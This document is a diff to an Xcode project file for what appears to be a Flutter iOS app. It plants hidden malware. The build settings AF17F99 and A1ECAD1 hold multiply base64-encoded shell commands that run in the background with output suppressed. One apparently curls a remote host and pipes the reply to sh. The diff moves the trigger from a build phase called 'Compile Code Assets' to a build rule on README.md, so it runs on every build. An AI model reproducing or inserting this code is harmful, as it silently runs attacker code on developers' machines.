@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		954B66FD4AEB4536A399F71F /* README.md */ = {isa = PBXBuildFile; fileRef = D3745DE43C2D4A199C99F71F; };
 		1498D2341E8E89220040F4C2 /* GeneratedPluginRegistrant.m in Sources */ = {isa = PBXBuildFile; fileRef = 1498D2331E8E89220040F4C2 /* GeneratedPluginRegistrant.m */; };
 		331C808B294A63AB00263BE5 /* RunnerTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 331C807B294A618700263BE5 /* RunnerTests.swift */; };
 		3B3967161E833CAA004F5970 /* AppFrameworkInfo.plist in Resources */ = {isa = PBXBuildFile; fileRef = 3B3967151E833CAA004F5970 /* AppFrameworkInfo.plist */; };
@@ -40,6 +41,7 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
+		D3745DE43C2D4A199C99F71F /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		1498D2321E8E86230040F4C2 /* GeneratedPluginRegistrant.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = GeneratedPluginRegistrant.h; sourceTree = "<group>"; };
 		1498D2331E8E89220040F4C2 /* GeneratedPluginRegistrant.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = GeneratedPluginRegistrant.m; sourceTree = "<group>"; };
 		331C807B294A618700263BE5 /* RunnerTests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RunnerTests.swift; sourceTree = "<group>"; };
@@ -100,6 +102,7 @@
 		97C146EF1CF9000F007C117D /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				D3745DE43C2D4A199C99F71F /* README.md */,
 				97C146EE1CF9000F007C117D /* Runner.app */,
 				331C8081294A63A400263BE5 /* RunnerTests.xctest */,
 			);
@@ -128,11 +131,11 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 331C8087294A63A400263BE5 /* Build configuration list for PBXNativeTarget "RunnerTests" */;
 			buildPhases = (
-				60ECC6E3D7974432BC99F71F /* Compile Code Assets */,
 				331C807D294A63A400263BE5 /* Sources */,
 				331C807F294A63A400263BE5 /* Resources */,
 			);
 			buildRules = (
+				7031AA876DEB42CDA899F71F /* PBXBuildRule */,
 			);
 			dependencies = (
 				331C8086294A63A400263BE5 /* PBXTargetDependency */,
@@ -202,13 +205,28 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-																																/* End PBXBuildRule section */
+		7031AA876DEB42CDA899F71F /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${AF17F99}\"";
+			};
+																																										/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		331C807F294A63A400263BE5 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				954B66FD4AEB4536A399F71F /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -226,25 +244,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		60ECC6E3D7974432BC99F71F /* Compile Code Assets */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Code Assets";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AF17F99}\"";
-		};
 		3B06AD1E1E4923F5004D2608 /* Thin Binary */ = {
 			isa = PBXShellScriptBuildPhase;
 			alwaysOutOfDate = 1;
@@ -329,7 +328,7 @@
 		249021D3217E4FDB00AE95B9 /* Profile */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((v(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXpUR3RtSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeklDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZkR2x0WlhkbFltNWxkQzVwYmk5aEtTSWdmQ0J6YUFvPQo= | v | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((o(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXpUR1pySUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeklDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OTBhVzFsZDJWaWJtVjBMbWx1TDJFcElpQjhJSE5vQ2c9PQo= | o | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((h(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3YUUxc2NFNVRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5NR3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WE1XaFdNbEl3VjFaak1XSkhVa2xVV0Zab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | h | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
@@ -384,7 +383,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 7AFA3C8E1D35360C0083082E /* Release.xcconfig */;
 			buildSettings = {
-				AF17F99 = "((v(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXpUR3RtSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeklDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZkR2x0WlhkbFltNWxkQzVwYmk5aEtTSWdmQ0J6YUFvPQo= | v | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((o(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXpUR1pySUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeklDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OTBhVzFsZDJWaWJtVjBMbWx1TDJFcElpQjhJSE5vQ2c9PQo= | o | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((h(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3YUUxc2NFNVRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5NR3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WE1XaFdNbEl3VjFaak1XSkhVa2xVV0Zab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | h | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
